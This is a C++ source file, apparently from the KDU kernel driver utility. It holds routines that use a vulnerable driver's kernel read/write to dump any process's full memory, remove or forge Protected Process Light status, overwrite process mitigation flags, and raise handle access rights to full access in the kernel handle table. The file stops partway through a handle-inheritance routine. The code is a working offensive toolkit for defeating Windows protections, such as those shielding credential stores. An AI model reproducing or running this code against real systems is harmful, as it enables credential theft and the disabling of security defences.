/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2026
*
*  TITLE:       PS.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Processes DKOM related routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <TlHelp32.h>
#include <Dbghelp.h>

typedef BOOL(WINAPI* pfnMiniDumpWriteDump)(
    _In_ HANDLE hProcess,
    _In_ DWORD ProcessId,
    _In_ HANDLE hFile,
    _In_ MINIDUMP_TYPE DumpType,
    _In_opt_ PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    _In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    _In_opt_ PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

BOOL KDUVerifyProviderCallbacksForOpenProcess(
    _In_ PKDU_CONTEXT Context
)
{
    if (Context->Provider->Callbacks.OpenProcess == NULL)
        return FALSE;
    return TRUE;
}

LPCSTR KDUGetProtectionTypeAsString(
    _In_ ULONG Type
)
{
    LPCSTR typeStrings[] = {
        "PsProtectedTypeNone",
        "PsProtectedTypeProtectedLight",
        "PsProtectedTypeProtected"
    };

    return (Type <= PsProtectedTypeProtected) ? typeStrings[Type] : "Unknown Type";
}

LPCSTR KDUGetProtectionSignerAsString(
    _In_ ULONG Signer
)
{
    static LPCSTR signerStrings[] = {
        "PsProtectedSignerNone",
        "PsProtectedSignerAuthenticode",
        "PsProtectedSignerCodeGen",
        "PsProtectedSignerAntimalware",
        "PsProtectedSignerLsa",
        "PsProtectedSignerWindows",
        "PsProtectedSignerWinTcb",
        "PsProtectedSignerWinSystem",
        "PsProtectedSignerApp"
    };

    return (Signer <= PsProtectedSignerApp) ? signerStrings[Signer] : "Unknown Value";
}

/*
* KDUDumpProcessMemory
*
* Purpose:
*
* Dump process memory.
*
*/
BOOL KDUDumpProcessMemory(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE ProcessId
)
{
    BOOL bResult = FALSE;
    HMODULE dbgModule = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE processHandle = NULL;
    pfnMiniDumpWriteDump pMiniDumpWriteDump;

	if (!KDUVerifyProviderCallbacksForOpenProcess(Context)) {
		supPrintfEvent(kduEventError, "Provider does not support OpenProcess callback\r\n");
		return FALSE;
	}

    WCHAR szOutputName[MAX_PATH];
    PSYSTEM_PROCESS_INFORMATION procEntry = NULL;
    PVOID procBuffer = supGetSystemInfo(SystemProcessInformation);

    if (!procBuffer) {
        supPrintfEvent(kduEventError, "Cannot allocate process list\r\n");
        return FALSE;
    }

    do {
        if (!ntsupQueryProcessEntryById(ProcessId, (PBYTE)procBuffer, &procEntry)) {
            supPrintfEvent(kduEventError,
                "The %lX process doesn't exist in process list\r\n",
                HandleToUlong(ProcessId));
            break;
        }

        supPrintfEvent(kduEventInformation, "[+] Dumping memory of the process 0x%lX (%wZ)\r\n",
            HandleToUlong(ProcessId), procEntry->ImageName);

        dbgModule = LoadLibraryEx(L"dbghelp.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
        if (dbgModule == NULL) {
            supShowWin32Error("[!] Cannot load dbghelp.dll", GetLastError());
            break;
        }

        pMiniDumpWriteDump = (pfnMiniDumpWriteDump)GetProcAddress(dbgModule, "MiniDumpWriteDump");
        if (pMiniDumpWriteDump == NULL) {
            supShowWin32Error("[!] Dump function is not found", GetLastError());
            break;
        }

        bResult = KDUOpenProcess(Context, ProcessId, PROCESS_ALL_ACCESS, &processHandle);
        if (!bResult || processHandle == NULL) {
            supShowWin32Error("[!] Cannot open process", GetLastError());
            break;
        }

        StringCchPrintf(szOutputName,
            RTL_NUMBER_OF(szOutputName),
            TEXT("vmem_pid_%lX.dmp"),
            HandleToUlong(ProcessId));

        hFile = CreateFile(szOutputName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            supShowWin32Error("[!] Cannot write memory dump", GetLastError());
            break;
        }

        bResult = pMiniDumpWriteDump(processHandle,
            0,
            hFile,
            MiniDumpWithFullMemory,
            NULL,
            NULL,
            NULL);

        if (bResult) {
            supPrintfEvent(kduEventInformation, "[+] Process memory dumped to %ws\r\n", szOutputName);
        }
        else {
            supShowWin32Error("[!] Cannot dump process", GetLastError());
        }

    } while (FALSE);

    supHeapFree(procBuffer);
    if (processHandle) NtClose(processHandle);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (dbgModule) FreeLibrary(dbgModule);

    return bResult;
}

/*
* KDURunCommandPPL
*
* Purpose:
*
* Start a Process as PPL-Antimalware
*
*/
BOOL KDURunCommandPPL(
    _In_ PKDU_CONTEXT Context,
    _In_ LPWSTR CommandLine,
    _In_ BOOL HighestSigner)
{
    DWORD dwThreadResumeCount = 0;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    RtlZeroMemory(&pi, sizeof(pi));

    wprintf_s(L"[+] Creating Process '%s'\r\n", CommandLine);

    if (!CreateProcess(
        NULL,               // No module name (use command line)
        CommandLine,        // Command line
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        FALSE,              // Set handle inheritance to FALSE
        CREATE_SUSPENDED,   // Create Process suspended so we can edit
        // its protection level prior to starting
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory 
        &si,                // Pointer to STARTUPINFO structure
        &pi))
    {
        supShowWin32Error("[!] Failed to create process", GetLastError());
        return FALSE;
    }

    printf_s("[+] Created Process with PID %lu\r\n", pi.dwProcessId);

    PS_PROTECTED_SIGNER signer;
    PS_PROTECTED_TYPE type;
    if (HighestSigner) { // the highest observed protection is WinTcb(6)/ProtectedLight(1)
        signer = PsProtectedSignerWinTcb;
        type = PsProtectedTypeProtectedLight;
    }
    else {
        signer = PsProtectedSignerAntimalware;
        type = PsProtectedTypeProtectedLight;
    }

    if (!KDUControlProcessProtections(Context, pi.dwProcessId, signer, type)) {
        supShowWin32Error("[!] Failed to set process as PPL", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    dwThreadResumeCount = ResumeThread(pi.hThread);
    if (dwThreadResumeCount != 1) {
        printf_s("[!] Failed to resume process: %lu | 0x%lX\n", dwThreadResumeCount, GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

/*
* KDUUnprotectProcess
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL KDUUnprotectProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId)
{
    return KDUControlProcessProtections(Context, ProcessId, PsProtectedSignerNone, PsProtectedTypeNone);
}

/*
* KDUUnmitigateProcess
*
* Purpose:
*
* Modify process object to remove process mitigations.
*
*/
BOOL KDUUnmitigateProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ ULONG PsNewMitigations,
    _In_ INT TargetedFlags)
{
    return KDUControlProcessMitigationFlags(Context, ProcessId, PsNewMitigations, TargetedFlags);
}

/*
* printProtection
*
* Purpose:
*
* Print process protection with string descriptions.
*
*/
VOID printProtection(
    _In_ ULONG Buffer
)
{
    PS_PROTECTION* PsProtection = (PS_PROTECTION*)&Buffer;

    printf_s("\tPsProtection->Type: %lu (%s)\r\n",
        PsProtection->Type,
        KDUGetProtectionTypeAsString(PsProtection->Type));

    printf_s("\tPsProtection->Signer: %lu (%s)\r\n",
        PsProtection->Signer,
        KDUGetProtectionSignerAsString(PsProtection->Signer));

    printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
}

/*
* printMitigationFlags
*
* Purpose:
*
* Print ProcessMitigationsFlags2 value.
*
*/
VOID printMitigationFlags(
    _In_ INT Index,
    _In_ ULONG Buffer
)
{
    // PS_MITIGATION* PsMitigation = (PS_MITIGATION*)&Buffer; // TODO parse?
    printf_s("\tPsMitigationFlags%i: 0x%lX\r\n", Index, Buffer);
}

/*
* KDUGetEprocessOffsets
*
* Purpose:
*
* Get all EPROCESS offsets (PsProtection, MitigationFlags1, MitigationFlags2)
* for specific Windows version.
*
*/
BOOL KDUGetEprocessOffsets(
    _In_ ULONG NtBuildNumber,
    _Out_ PKDU_EPROCESS_OFFSETS Offsets
)
{
    Offsets->PsProtectionOffset = 0;
    Offsets->MitigationFlags1Offset = 0;
    Offsets->MitigationFlags2Offset = 0;
    Offsets->ObjectTableOffset = 0;
	Offsets->HandleTableOffset = HandleTableOffset_all;

    switch (NtBuildNumber) {

    case NT_WIN8_BLUE:
        Offsets->PsProtectionOffset = PsProtectionOffset_9600;
        break;

    case NT_WIN10_THRESHOLD1:
        Offsets->PsProtectionOffset = PsProtectionOffset_10240;
        break;

    case NT_WIN10_THRESHOLD2:
        Offsets->PsProtectionOffset = PsProtectionOffset_10586;
        break;

    case NT_WIN10_REDSTONE1:
        Offsets->PsProtectionOffset = PsProtectionOffset_14393;
        break;

    case NT_WIN10_REDSTONE2:
        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
        break;

    case NT_WIN10_REDSTONE3:
    case NT_WIN10_REDSTONE4:
        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_RS3;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_RS3;
        break;

    case NT_WIN10_REDSTONE5:
        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_RS5;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_RS5;
        break;

    case NT_WIN10_19H1:
    case NT_WIN10_19H2:
        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_18362;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_18362;
        break;

    case NT_WIN10_20H1:
    case NT_WIN10_20H2:
    case NT_WIN10_21H1:
    case NT_WIN10_21H2:
    case NT_WIN10_22H2:
    case NT_WINSRV_21H1:
    case NT_WIN11_21H2:
    case NT_WIN11_22H2:
    case NT_WIN11_23H2:
        Offsets->PsProtectionOffset = PsProtectionOffset_19041;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_19041;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_19041;
        Offsets->ObjectTableOffset = ObjectTableOffset_19041;
        break;

    case NT_WIN11_24H2:
    case NT_WIN11_25H2:
        Offsets->PsProtectionOffset = PsProtectionOffset_26100;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_26100;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_26100;
		Offsets->ObjectTableOffset = ObjectTableOffset_26100;
        break;

    default:
        return FALSE;
    }

    return TRUE;
}

BOOL KDUVerifyProviderCallbacksForPsPatch(
    _In_ PKDU_CONTEXT Context
)
{
    if (Context->Provider->Callbacks.ReadKernelVM == NULL ||
        Context->Provider->Callbacks.WriteKernelVM == NULL)
    {
        return FALSE;
    }

    return TRUE;
}

/*
* KDUControlProcessProtections
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL KDUControlProcessProtections(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ PS_PROTECTED_SIGNER PsProtectionSigner,
    _In_ PS_PROTECTED_TYPE PsProtectionType)
{
    BOOL       bResult = FALSE;
    ULONG      Buffer;
    NTSTATUS   ntStatus;
    ULONG_PTR  ProcessObject = 0, VirtualAddress = 0;
    HANDLE     hProcess = NULL;

    KDU_EPROCESS_OFFSETS offsets;
    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    if (!KDUVerifyProviderCallbacksForPsPatch(Context))
        return FALSE;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
        &obja, &clientId);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
        bResult = supQueryObjectFromHandle(hProcess, &ProcessObject);

        if (bResult && (ProcessObject != 0)) {

            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

            if (!KDUGetEprocessOffsets(Context->NtBuildNumber, &offsets) ||
                offsets.PsProtectionOffset == 0)
            {
                supPrintfEvent(kduEventError,
                    "[!] Unsupported WinNT version\r\n");

            }
            else {

                VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, offsets.PsProtectionOffset);

                printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);

                Buffer = 0;

                if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress,
                    &Buffer,
                    sizeof(ULONG)))
                {
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
                    printProtection(Buffer);

                    Buffer = (Buffer & 0xFFFFFF00) | ((PsProtectionSigner << 4) | (PsProtectionType & 0x7));

                    bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                        VirtualAddress,
                        &Buffer,
                        sizeof(UCHAR));

                    if (bResult) {
                        printf_s("[+] Process object modified\r\n");

                        ULONG verifyBuf = 0;
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress,
                            &verifyBuf,
                            sizeof(UCHAR)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
                            printf_s("\tNew PsProtection: 0x%02X\n", verifyBuf & 0xff);
                            printProtection(verifyBuf);
                        }
                    }
                    else {

                        supPrintfEvent(kduEventError,
                            "[!] Cannot modify process object\r\n");

                    }
                }
                else {

                    supPrintfEvent(kduEventError,
                        "[!] Cannot read kernel memory\r\n");

                }
            }
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Cannot query process object\r\n");
        }
        NtClose(hProcess);
    }
    else {
        supShowHardError("[!] Cannot open target process", ntStatus);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}

/*
* KDUControlProcessMitigationFlags
*
* Purpose:
*
* Modify process object to remove process MitigationFlags.
*
*/
BOOL KDUControlProcessMitigationFlags(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ ULONG PsNewMitigations,
    _In_ INT TargetedFlags)
{
    BOOL       bResult1 = TRUE;
    BOOL       bResult2 = TRUE;
    ULONG      Buffer1, Buffer2;
    NTSTATUS   ntStatus;
    ULONG_PTR  ProcessObject = 0, VirtualAddress1 = 0, VirtualAddress2 = 0;
    HANDLE     hProcess = NULL;

    KDU_EPROCESS_OFFSETS offsets;
    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    if (!KDUVerifyProviderCallbacksForPsPatch(Context))
        return FALSE;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
        &obja, &clientId);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
        bResult1 = supQueryObjectFromHandle(hProcess, &ProcessObject);

        if (bResult1 && (ProcessObject != 0)) {

            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

            if (!KDUGetEprocessOffsets(Context->NtBuildNumber, &offsets) ||
                offsets.MitigationFlags1Offset == 0 ||
                offsets.MitigationFlags2Offset == 0)
            {

                supPrintfEvent(kduEventError,
                    "[!] Unsupported WinNT version\r\n");

            }
            else {

                VirtualAddress1 = EPROCESS_TO_MITIGATIONFLAGS(ProcessObject, offsets.MitigationFlags1Offset);
                VirtualAddress2 = EPROCESS_TO_MITIGATIONFLAGS(ProcessObject, offsets.MitigationFlags2Offset);

                printf_s("[+] EPROCESS->PS_MITIGATION_FLAGS1, 0x%llX\r\n", VirtualAddress1);
                printf_s("[+] EPROCESS->PS_MITIGATION_FLAGS2, 0x%llX\r\n", VirtualAddress2);

                Buffer1 = Buffer2 = 0;

                bResult1 = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress1,
                    &Buffer1,
                    sizeof(ULONG));

                bResult2 = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress2,
                    &Buffer2,
                    sizeof(ULONG));

                if (bResult1 && bResult2)
                {
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress1);
                    printMitigationFlags(1, Buffer1);
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress2);
                    printMitigationFlags(2, Buffer2);

                    Buffer1 = Buffer2 = PsNewMitigations;

                    if (TargetedFlags & PS_MITIGATION_FLAGS1) {
                        printf_s("[+] Overwriting MitigationFlags1\r\n");
                        bResult1 = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                            VirtualAddress1,
                            &Buffer1,
                            sizeof(ULONG));
                    }

                    if (TargetedFlags & PS_MITIGATION_FLAGS2) {
                        printf_s("[+] Overwriting MitigationFlags2\r\n");
                        bResult2 = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                            VirtualAddress2,
                            &Buffer2,
                            sizeof(ULONG));
                    }

                    if (bResult1 && bResult2) {
                        printf_s("[+] Process object(s) modified\r\n");

                        ULONG verifyBuf1 = 0xDEADBEEF; // if DEADBEEF is in output, read failed, this is a sanity check
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress1,
                            &verifyBuf1,
                            sizeof(ULONG)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress1);
                            printMitigationFlags(1, verifyBuf1);
                        }

                        ULONG verifyBuf2 = 0xDEADBEEF;
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress2,
                            &verifyBuf2,
                            sizeof(ULONG)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress2);
                            printMitigationFlags(2, verifyBuf2);
                        }

                    }
                    else {

                        supPrintfEvent(kduEventError,
                            "[!] Cannot modify process object\r\n");

                    }
                }
                else {

                    supPrintfEvent(kduEventError,
                        "[!] Cannot read kernel memory\r\n");

                }
            }
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Cannot query process object\r\n");
        }
        NtClose(hProcess);
    }
    else {
        supShowHardError("[!] Cannot open target process", ntStatus);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult1 && bResult2;
}

ULONG_PTR LookupHandleEntry(
    _In_ PKDU_CONTEXT Context,
    ULONG_PTR HandleTable,
    HANDLE HandleValue,
	KDU_EPROCESS_OFFSETS offsets
)
{
    ULONG_PTR TableCode;
    ULONG_PTR Level;
    ULONG_PTR Base;
    ULONG_PTR Index;

	// get the redirection level and base address from the handle table
    if (!Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
        HANDLE_TABLE_OFFSET(HandleTable, offsets.HandleTableOffset),
        &TableCode,
        sizeof(ULONG_PTR)))
    {
        return 0;
    }

    Level = TableCode & 3;
    Base = TableCode & ~3;

    Index = ((ULONG_PTR)HandleValue) >> 2;

    switch (Level)
    {
    case 0:
    {
        return Base + (Index * sizeof(HANDLE_TABLE_ENTRY));
    }

    case 1:
    {
        ULONG_PTR Mid;

        if (!Context->Provider->Callbacks.ReadKernelVM(
            Context->DeviceHandle,
            Base + ((Index >> 8) * sizeof(ULONG_PTR)),
            &Mid,
            sizeof(Mid))) {
            return 0;
        }

        return Mid + ((Index & 0xFF) * sizeof(HANDLE_TABLE_ENTRY));
    }

    case 2:
    {
        ULONG_PTR L1;
        ULONG_PTR L2;

        if (!Context->Provider->Callbacks.ReadKernelVM(
            Context->DeviceHandle,
            Base + ((Index >> 16) * sizeof(ULONG_PTR)),
            &L1,
            sizeof(L1)))
        {
            return 0;
        }

        if (!Context->Provider->Callbacks.ReadKernelVM(
            Context->DeviceHandle,
            L1 + (((Index >> 8) & 0xFF) * sizeof(ULONG_PTR)),
            &L2,
            sizeof(L2)))
        {
            return 0;
        }

        return L2 + ((Index & 0xFF) * sizeof(HANDLE_TABLE_ENTRY));
    }
    }

    return 0;
}

/*
* 
* KDUControlHandleAccess
* 
* Purpose:
* 
* Modify an existing handle's access rights
*/
BOOL KDUControlHandleAccess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ HANDLE HandleValue,
    _In_ ACCESS_MASK NewAccessMask)
{
	BOOL       bResult = FALSE;
	NTSTATUS   ntStatus;
	ULONG_PTR  ProcessObject = 0, HandleTable = 0, HandleEntry = 0;
	HANDLE     hProcess = NULL;
	CLIENT_ID clientId;
	OBJECT_ATTRIBUTES obja;
	KDU_EPROCESS_OFFSETS offsets;
	
    if (!KDUVerifyProviderCallbacksForPsPatch(Context)) {
		supPrintfEvent(kduEventError, 
            "[!] Provider does not support required callbacks for handle access control\r\n");
        return FALSE;
    }

    if (!KDUGetEprocessOffsets(Context->NtBuildNumber, &offsets) ||
        offsets.ObjectTableOffset == 0)
    {
        supPrintfEvent(kduEventError, 
            "[!] Unsupported WinNT version\r\n");
        return FALSE;
    }

	FUNCTION_ENTER_MSG(__FUNCTION__);
	InitializeObjectAttributes(&obja, NULL, 0, 0, 0);
	clientId.UniqueProcess = (HANDLE)ProcessId;
	clientId.UniqueThread = NULL;
	
    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
		&obja, &clientId);
	
    if (NT_SUCCESS(ntStatus)) {
		printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
		bResult = supQueryObjectFromHandle(hProcess, &ProcessObject);
		
        if (bResult && (ProcessObject != 0)) {
			printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);
			
            // read the ObjectTable pointer from the EPROCESS structure
			if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
				EPROCESS_TO_OBJECTTABLE(ProcessObject, offsets.ObjectTableOffset),
				&HandleTable,
				sizeof(ULONG_PTR))) 
            {
				printf_s("[+] ObjectTable pointer read: 0x%llX\r\n", HandleTable);

                // parse the layer type
				HandleEntry = LookupHandleEntry(Context, HandleTable, HandleValue, offsets);
				if (HandleEntry != 0) {
				    printf_s("[+] HandleEntry pointer read: 0x%llX\r\n", HandleEntry);

				    // read the current access rights from the HandleTableEntry
				    HANDLE_TABLE_ENTRY entry = { 0 };
                    if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                        HandleEntry,
                        &entry,
                        sizeof(entry)))
                    {
                        printf_s("[+] Current Handle access rights: 0x%lX\r\n", entry.GrantedAccess);

                        // modify the access rights
                        bResult = Context->Provider->Callbacks.WriteKernelVM(
                            Context->DeviceHandle,
                            HandleEntry + offsetof(HANDLE_TABLE_ENTRY, GrantedAccess),
                            &NewAccessMask,
                            sizeof(ULONG)
                        );

                        if (bResult) { // and verify
                            printf_s("[+] Handle access rights modified successfully.\r\n");
                            if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                                HandleEntry,
                                &entry,
                                sizeof(entry)))
                            {
                                if ((entry.GrantedAccess & NewAccessMask) == NewAccessMask) {
                                    printf_s("[+] Verified: Handle access rights updated to 0x%lX.\r\n", entry.GrantedAccess);
                                }
                                else {
                                    bResult = FALSE; // 
                                    supPrintfEvent(kduEventError, 
                                        "[!] Verification failed: Handle access rights are 0x%lX, expected 0x%lX.\r\n", entry.GrantedAccess, NewAccessMask);
                                }
                            }
                            else {
                                printf_s("[!] Warning: Failed to read back HandleTableEntry after modification, continuing...\r\n");
                            }
                        }
                        else {
                            supPrintfEvent(kduEventError, 
                                "[!] Failed to modify handle access rights\r\n");
                        }
                    }
                    else {
						supPrintfEvent(kduEventError, 
                            "[!] Cannot read HandleTableEntry\r\n");
                    }
				}
				else {
					supPrintfEvent(kduEventError, 
                        "[!] Cannot read HandleTableEntry\r\n");
				}
			}
			else {
				supPrintfEvent(kduEventError,
					"[!] Cannot read ObjectTable pointer\r\n");
			}
		}
		else {
			supPrintfEvent(kduEventError,
				"[!] Cannot query process object\r\n");
		}
		NtClose(hProcess);
	}
	else {
		supShowHardError("[!] Cannot open target process", ntStatus);
	}

	FUNCTION_LEAVE_MSG(__FUNCTION__);

	return bResult;
}

BOOL KDUSetHandleInheritable(HANDLE hHandle)
{
	DWORD flags = 0;
	if (!GetHandleInformation(hHandle, &flags)) {
		printf_s("[!] GetHandleInformation failed. Error: %lu\n", GetLastError());
		return FALSE; // safe exit instead of undefined continuation
	}
	if (flags & HANDLE_FLAG_INHERIT) { // already inheritable
        printf_s("[+] Ok: The handle %p is already inheritable.\n", hHandle);
        return TRUE;
    }
	if (!SetHandleInformation(hHandle, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
		printf_s("[!] SetHandleInformation failed. Error: %lu\n", GetLastError());
		return FALSE;
	}
	printf_s("[+] Success: Set HANDLE_FLAG_INHERIT on the handle %p.\n", hHandle);
	return TRUE;
}

BOOL KDUSetAccessRights(PKDU_CONTEXT Context, HANDLE hHandle, ACCESS_MASK accessMask)
{
    unsigned char buf[sizeof(OBJECT_BASIC_INFORMATION)] = {};
    ULONG returnLength;

    NTSTATUS status = NtQueryObject(hHandle, ObjectBasicInformation, buf, sizeof(buf), &returnLength);
    if (status == STATUS_SUCCESS) {
        POBJECT_BASIC_INFORMATION pBasicInfo = (POBJECT_BASIC_INFORMATION)buf;
        if ((pBasicInfo->GrantedAccess & accessMask) == accessMask) {
            printf_s("[+] Ok: The handle %p already has the required rights 0x%lX to the target process.\n", hHandle, accessMask);
            return TRUE;
        }
        else {
            printf_s("[-] Warning: Handle %p only has access rights: 0x%lX. Attempting to modify...\n", hHandle, pBasicInfo->GrantedAccess);

            // attempt to modify the handle's access rights using KDUControlHandleAccess
            return KDUControlHandleAccess(Context, GetCurrentProcessId(), hHandle, PROCESS_ALL_ACCESS);
        }
    }
    else {
        printf_s("[!] Failed to query handle information with status: 0x%lX\n", status);
        return FALSE;
    }
}

/*
* KDURunCommandInheritee
*
* Purpose:
*
* Open handles and start a process which will inherit these handles
*
*/
BOOL KDURunCommandInheritee(
    _In_ PKDU_CONTEXT Context,
    _In_ LPWSTR CommandLine,
    _In_ ULONG_PTR TargetProcessId,
    _In_ BOOL OpenThreads,
    _In_ ULONG_PTR PPLLevel)
{
	// try to open the target process directly with PROCESS_ALL_ACCESS
    HANDLE hTargetProc;
    hTargetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)TargetProcessId);
    if (hTargetProc == NULL) {
        
        // fallback to PROCESS_QUERY_LIMITED_INFORMATION
        hTargetProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)TargetProcessId);
        
        if (hTargetProc == NULL) {
            // fallback to KDUOpenProcess when user-mode cannot open target proc
            printf_s("[-] Target process %llu cannot be opened via user-mode, fallback to KDUOpenProcess()\r\n", TargetProcessId);

            if (!KDUVerifyProviderCallbacksForOpenProcess(Context)) {
                supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary process handle acquisition.\r\n");
                return FALSE;
            }
            if (!KDUOpenProcess(Context, (HANDLE)TargetProcessId, PROCESS_ALL_ACCESS, &hTargetProc)) {
                printf_s("[!] Failed to open target process %llu via user- and kernel-mode.", TargetProcessId);
                return FALSE;
            }
            printf_s("[+] Opened target process %llu via KDUOpenProcess and got hProc %p\r\n", TargetProcessId, hTargetProc);
        }
        else {
            printf_s("[+] Opened target process %llu with PROCESS_QUERY_LIMITED_INFORMATION and got hProc %p\r\n", TargetProcessId, hTargetProc);
        }
    }
    else {
        printf_s("[+] Opened target process %llu with PROCESS_ALL_ACCESS and got hProc %p\r\n", TargetProcessId, hTargetProc);
    }

    // check if handle is inheritable, if not, set it to be inheritable
    if (!KDUSetHandleInheritable(hTargetProc)) {
        supPrintfEvent(kduEventError, 
            "[!] Not continuing due to failure in setting handle inheritance.\n");
        return FALSE;
    }

    // check if handle has PROCESS_FULL_ACCESS rights (requesting FULL_ACCESS may still lead to stripped access)
	if (!KDUSetAccessRights(Context, hTargetProc, PROCESS_ALL_ACCESS)) {
		supPrintfEvent(kduEventError, 
            "[!] Not continuing due to failure in setting handle access rights.\n");
		return FALSE;
	}

	// open all process threads if requested, set them to be inheritable and patch to THREAD_ALL_ACCESS
	if (OpenThreads) {
		printf_s("[+] Opening all threads of target process %llu, set inheritable and THREAD_ALL_ACCESS...\n", TargetProcessId);
		
        HANDLE threadHandles[MAX_THREADS]; // arbitrary limit
        size_t threadCount = 0;

